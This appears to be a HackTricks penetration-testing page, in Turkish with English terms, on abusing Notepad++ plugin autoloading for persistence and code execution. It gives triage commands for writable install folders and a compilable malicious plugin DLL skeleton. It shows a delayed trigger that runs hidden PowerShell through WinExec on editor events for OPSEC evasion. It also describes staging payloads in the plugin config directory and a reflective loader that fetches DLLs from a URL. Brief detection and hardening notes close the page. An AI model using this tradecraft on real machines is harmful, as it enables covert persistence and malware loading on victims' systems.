# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ başlatıldığında `plugins` alt klasörleri altında bulunan her plugin DLL dosyasını **autoload** eder. Herhangi bir **yazılabilir Notepad++ kurulumu** içine kötü amaçlı bir plugin bırakmak, editör her başladığında `notepad++.exe` içinde code execution sağlar; bu da **persistence**, gizli **initial execution** veya editör elevated olarak başlatılıyorsa bir **in-process loader** olarak kötüye kullanılabilir.

**Notepad++ 7.6+** sürümünden beri beklenen manuel kurulum düzeni, plugin başına **bir alt klasör** şeklindedir (`plugins\<PluginName>\<PluginName>.dll`). **portable mode**'da (`notepad++.exe` yanında `doLocalConf.xml` bulunması), tüm application tree bu dizinde yerel kalır; bu da kopyalanmış/admin tool paketlerini çoğu zaman kolayca kullanıcı-yazılabilir bir execution surface haline getirir.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (genellikle yazmak için admin gerekir).
- Düşük yetkili operators için yazılabilir seçenekler:
- Kullanıcı-yazılabilir bir klasörde **portable Notepad++ build** kullanın.
- `C:\Program Files\Notepad++` klasörünü kullanıcı kontrolündeki bir yola kopyalayın (ör. `%LOCALAPPDATA%\npp\`) ve `notepad++.exe` dosyasını oradan çalıştırın.
- Zaten `doLocalConf.xml` içeren ve `Program Files` dışında bulunan **admin tool bundles**, çıkarılmış zip kopyaları veya help-desk toolkits arayın.
- Her plugin, `plugins` altında kendi alt klasörünü alır ve başlangıçta otomatik yüklenir; menü girdileri **Plugins** altında görünür.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin yükleme noktaları (execution primitives)
Notepad++ belirli **exported functions** bekler. Bunların hepsi initialization sırasında çağrılır ve birden fazla execution surface sağlar:
- **`DllMain`** — DLL load olur olmaz çalışır (ilk execution point).
- **`setInfo(NppData)`** — yükleme sırasında bir kez çağrılır ve Notepad++ handles sağlar; menu items kaydetmek için tipik yerdir.
- **`getName()`** — menüde gösterilen plugin adını döndürür.
- **`getFuncsArray(int *nbF)`** — menu commands döndürür; boş olsa bile startup sırasında çağrılır.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events alır (payloads’u bir user action veya editor event’ine kadar ertelemek için kullanışlıdır).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, daha büyük data exchanges için kullanışlıdır.
- **`isUnicode()`** — load sırasında kontrol edilen compatibility flag.

Çoğu export **stubs** olarak uygulanabilir; execution, autoload sırasında `DllMain` veya yukarıdaki herhangi bir callback’ten gerçekleşebilir.

## Minimal malicious plugin skeleton
Beklenen exports ile bir DLL compile edin ve writable bir Notepad++ folder altında `plugins\\MyNewPlugin\\MyNewPlugin.dll` içine yerleştirin:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL'yi oluşturun (Visual Studio/MinGW).
2. `plugins` altında plugin alt klasörünü oluşturun ve DLL'yi içine bırakın.
3. Notepad++'ı yeniden başlatın; DLL otomatik olarak yüklenir, `DllMain` ve sonraki callback'ler çalışır.

## `beNotified` üzerinden düşük gürültülü tetikleme kalıbı
OPSEC için, birçok payload **DllMain** içinden tetiklenmemelidir. Daha sessiz bir kalıp, plugin'in temiz şekilde yüklenmesine izin vermek, ardından yalnızca **startup complete**, **buffer activation** veya **ilk yazılan karakter** gibi gerçekçi bir editor event'inden sonra çalıştırmaktır.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Bu, gürültülü bir `DllMain` beacon yerine public offensive research ile daha iyi uyum sağlar: DLL yine başlangıçta otomatik yüklenir, ancak kötü amaçlı eylem Notepad++ gerçekten kullanımda görünene kadar geciktirilir.

## Plugin config directory'yi secondary storage olarak kullanma
Notepad++, **mevcut kullanıcının plugin configuration directory'sini** döndüren `NPPM_GETPLUGINSCONFIGDIR` değerini sunar. Kötü amaçlı bir plugin, bunu on-disk DLL'i minimal tutmak için kullanabilir; aynı zamanda encrypted config, staged payloads veya tasking files'ı, normal plugin state ile uyumlu görünen bir path içinde saklayabilir.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- küçük bir autoload edilmiş bootstrap DLL;
- ana plugin binary’sine tekrar dokunmadan kullanıcı bazlı tasking;
- **autoload trigger**’ı daha ağır ikinci aşamadan ayırmak.

## Reflective loader plugin pattern
Silahlandırılmış bir plugin, Notepad++’ı bir **reflective DLL loader**’a dönüştürebilir:
- Minimal bir UI/menu girişi sunun (ör. "LoadDLL").
- Bir payload DLL almak için bir **file path** veya **URL** kabul edin.
- DLL’yi mevcut process içine reflectively map edin ve export edilmiş bir entry point’i çağırın (ör. indirilen DLL içindeki bir loader function).
- Faydası: yeni bir loader spawn etmek yerine zararsız görünen bir GUI process’i yeniden kullanır; payload, `notepad++.exe`’nin integrity’sini devralır (elevated contexts dahil).
- Dezavantajlar: diske **unsigned plugin DLL** bırakmak dikkat çeker; pratik bir varyasyon, autoload edilmiş plugin’i sadece bir stub olarak kullanıp gerçek implant’ı şifreli/staged olarak başka bir yerde tutmaktır.

## Detection and hardening notes
- Notepad++ plugin directories içindeki **writes**’leri bloklayın veya izleyin (user profiles içindeki portable kopyalar dahil); controlled folder access veya application allowlisting etkinleştirin.
- `plugins` altında **new unsigned DLLs** için, portable Notepad++ ağaçlarındaki değişiklikler için ve `notepad++.exe`’den gelen alışılmadık **child processes/network activity** için alarm üretin.
- Meşru plugin’ler için baseline oluşturun ve normal Notepad++ plugin interface’ini export ettiği halde shell, PowerShell veya network beacon başlatan herhangi bir yeni DLL’i araştırın.
- Plugin kurulumunu yalnızca **Plugins Admin** üzerinden zorunlu kılın ve portable kopyaların trust edilmeyen path’lerden çalıştırılmasını kısıtlayın.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
